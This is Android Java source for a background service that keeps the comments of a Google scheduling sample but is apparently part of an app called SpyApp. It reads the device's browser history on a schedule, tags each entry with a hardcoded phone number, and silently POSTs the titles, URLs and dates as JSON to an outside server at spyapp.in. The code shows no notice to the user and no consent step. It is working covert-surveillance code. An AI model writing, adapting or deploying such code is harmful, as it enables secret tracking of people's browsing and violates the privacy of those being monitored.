package com.example.avalanche.webhistoryrecording;

import android.app.IntentService;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.Browser;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * This {@code IntentService} does the app's actual work.
 * {@code SampleAlarmReceiver} (a {@code WakefulBroadcastReceiver}) holds a
 * partial wake lock for this service while the service does its work. When the
 * service is finished, it calls {@code completeWakefulIntent()} to release the
 * wake lock.
 */
public class SampleSchedulingService extends IntentService implements FetchDataListener {
    public SampleSchedulingService() {
        super("SchedulingService");
    }
    public static ProgressDialog pDialog;
    public static final String TAG = "Scheduling Demo";
    // An ID used to post the notification.
    public static final int NOTIFICATION_ID = 1;
    // The string the app searches for in the Google home page content. If the app finds
    // the string, it indicates the presence of a doodle.
    public static final String SEARCH_STRING = "doodle";
    // The Google home page URL from which the app fetches content.
    // You can find a list of other Google domains with possible doodles here:
    // http://en.wikipedia.org/wiki/List_of_Google_domains
    public static final String URL = "http://www.google.com";
    private NotificationManager mNotificationManager;
    NotificationCompat.Builder builder;
    String  created_last = "0";
    public static final String MyPREFERENCES = "MyPrefs";
    public static final String CREATED = "createdkey";
    private ArrayList<SpyApp> WebList;
    private static String CHROME_BOOKMARKS_URI = "content://com.android.chrome.browser/bookmarks";
   IntentFilter filter;
    @Override
    protected void onHandleIntent(Intent intent) {
        // BEGIN_INCLUDE(service_onhandle)
        // The URL from which to fetch content.
        String urlString = URL;

        String result ="";
        WebList = new ArrayList<SpyApp>();





        getWebInfo();

        // Try to connect to the Google homepage and download content.
        // Release the wake lock provided by the BroadcastReceiver.

        SampleAlarmReceiver.completeWakefulIntent(intent);
        // END_INCLUDE(service_onhandle)
    }

    private void getWebInfo() {

        //String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL,Browser.BookmarkColumns.CREATED };
        //String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark

        Log.e("created last ",created_last);
        SharedPreferences share = getSharedPreferences(MyPREFERENCES, MODE_PRIVATE);
        String value = (share.getString(CREATED, ""));

        if (value.equals("")){
          value="0";
        }

        Log.e("value ",value);

        //Cursor mCur = getContentResolver()
          //      .query(Uri.parse(CHROME_BOOKMARKS_URI), null, "bookmark = 0", null, null);
        Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, null,Browser.BookmarkColumns.CREATED + ">"+value, null, null);

        mCur.moveToFirst();

        @SuppressWarnings("unused")
        String title = "";
        @SuppressWarnings("unused")
        String url = "";
        @SuppressWarnings("unused")
        String created = "";
        SpyApp obj = null;
        String formattedDate = null;
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            boolean cont = true;
            while (mCur.isAfterLast() == false && cont) {
                title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
                url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
                created=mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.CREATED));
                // Do something with title and url
                mCur.moveToNext();
                //System.out.println("Bookmark "+mCur);
                Log.e("Bookmark ", title+" "+url+" "+created);



                 Calendar c = Calendar.getInstance();
                 //String currentDate = new SimpleDateFormat("yyyy/MM/dd").format(Calendar.getInstance().getTime());
                 SimpleDateFormat currentDateTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                 formattedDate = currentDateTime.format(c.getTime());
                 System.out.println("Current Date and Time "+currentDateTime);


                    //AsyncTaskClass task1 = new AsyncTaskClass(this);
                    //task1.execute("Web Info",title,url,"9000000000",formattedDate);
                    // obj=new SpyApp(title,url,"9000000000",formattedDate);

                obj=new SpyApp();
                obj.setNo("9990000000");
                obj.setUrl(url);
                obj.setDate(formattedDate);
                obj.setTitle(title);

                  WebList.add(obj);

                /*IntentFilter filter = null;
                Intent myIntent = new Intent(getApplicationContext(), Main2Activity.class);
                //Uri data = myIntent.getData();
                //filter.addAction(myIntent.getAction());
                //filter.addCategory(Intent.CATEGORY_DEFAULT);
                filter.addDataScheme("www.facebook.com");
                startActivity(myIntent);
*/



            }

            //Bundle b = new Bundle();
            //b.putSerializable("title", obj);

            new SendWebInfo().execute();

           // AsyncTaskClass task1 = new AsyncTaskClass(this);
           // task1.execute("Web Info",title,url,"9000000000",formattedDate);

        }

        if (mCur != null) {
            System.out.println("cursor value"+String.valueOf(mCur.getCount()));
            String pos=String.valueOf(mCur.getCount()-1);
            mCur.moveToLast();
            if (mCur.moveToLast()){
                created_last=mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.CREATED));

                  /*String url1 = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
                  Log.e("URL ",url1);
                   if (url1.equals("https://www.facebook.com/")){
                    Intent myIntent = new Intent(getApplicationContext(), Main2Activity.class);
                    filter = new IntentFilter();
                    filter.addAction(myIntent.getAction());
                    filter.addCategory(Intent.CATEGORY_DEFAULT);
                    //filter.addDataScheme(data.getScheme());
                    startActivity(myIntent);
                }*/

                SharedPreferences share_loginAs = getSharedPreferences(MyPREFERENCES, MODE_PRIVATE);
                SharedPreferences.Editor edit_loginAs = share_loginAs.edit();
                edit_loginAs.putString(CREATED, created_last);
                edit_loginAs.commit();

                System.out.println("created last "+created_last);

            }
        }
    }

    // Post a notification indicating whether a doodle was found.
    /*private void sendNotification(String msg) {
        mNotificationManager = (NotificationManager)
                this.getSystemService(Context.NOTIFICATION_SERVICE);

        PendingIntent contentIntent = PendingIntent.getActivity(this, 0,
                new Intent(this, MainActivity.class), 0);

        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setContentTitle(getString(R.string.doodle_alert))
                        .setStyle(new NotificationCompat.BigTextStyle()
                                .bigText(msg))
                        .setContentText(msg);

        mBuilder.setContentIntent(contentIntent);
        mNotificationManager.notify(NOTIFICATION_ID, mBuilder.build());
    }
*/
//
// The methods below this line fetch content from the specified URL and return the
// content as a string.
//
    /** Given a URL string, initiate a fetch operation. */
    private String loadFromNetwork(String urlString) throws IOException {
        InputStream stream = null;
        String str ="";

        try {
            stream = downloadUrl(urlString);
            str = readIt(stream);
        } finally {
            if (stream != null) {
                stream.close();
            }
        }
        return str;
    }

    /**
     * Given a string representation of a URL, sets up a connection and gets
     * an input stream.
     * @param urlString A string representation of a URL.
     * @return An InputStream retrieved from a successful HttpURLConnection.
     * @throws IOException
     */
    private InputStream downloadUrl(String urlString) throws IOException {

        java.net.URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setReadTimeout(10000 /* milliseconds */);
        conn.setConnectTimeout(15000 /* milliseconds */);
        conn.setRequestMethod("GET");
        conn.setDoInput(true);
        // Start the query
        conn.connect();
        InputStream stream = conn.getInputStream();
        return stream;
    }

    /**
     * Reads an InputStream and converts it to a String.
     * @param stream InputStream containing HTML from www.google.com.
     * @return String version of InputStream.
     * @throws IOException
     */

    private String readIt(InputStream stream) throws IOException {

        StringBuilder builder = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
        for(String line = reader.readLine(); line != null; line = reader.readLine())
            builder.append(line);
        reader.close();
        return builder.toString();
    }

    @Override
    public void onFetchComplete_WebList(ArrayList<SpyApp> data) {

    }


    private class SendWebInfo extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // TODO Auto-generated method stub
            String result="";
            JSONArray jsonArray = null, jsonArrayencode = null;
            int Webize=WebList.size();
            Log.e("websize", String.valueOf(Webize));

            jsonArray = new JSONArray();
            try {
                JSONObject jsonObject;
                for (int i = 0; i < WebList.size(); i++) {

                    String title= WebList.get(i).getTitle();
                    String no= WebList.get(i).getNo();
                    String date= WebList.get(i).getDate();
                    String url= WebList.get(i).getUrl();

                    jsonObject = new JSONObject();
                    jsonObject.put("title", title);
                    jsonObject.put("url", url);
                    jsonObject.put("mobile", no);
                    jsonObject.put("date", date);

                    jsonArray.put(jsonObject);

                    Log.e("jsonArraySize",jsonArray.toString());

                }
            } catch (JSONException e) {
            }



            try
            {
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost("http://www.spyapp.in/spyapp/api/web_history.php");

                System.out.println("get all Web info");
                // Add your data

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("jsonarray",jsonArray.toString()));
                //nameValuePairs.add(new BasicNameValuePair("url",url));
                //nameValuePairs.add(new BasicNameValuePair("mobile",no));
                //nameValuePairs.add(new BasicNameValuePair("date",dateTime));

                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                HttpResponse response = httpclient.execute(httppost);

                InputStream is = response.getEntity().getContent();
                InputStreamReader reader = new InputStreamReader(is);
                BufferedReader br = new BufferedReader(reader);
                while (true)
                {
                    String str = br.readLine();
                    if (str == null)
                        break;
                    result = result + str;
                }
                br.close();
                Log.e("call log=>", "" + result);
            }
            catch(Exception e)
            {
                e.printStackTrace();

            }

            Log.e("call log=>", "" + result);
            System.out.println("admin "+result);
            return null;
        }

        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }


    }

}
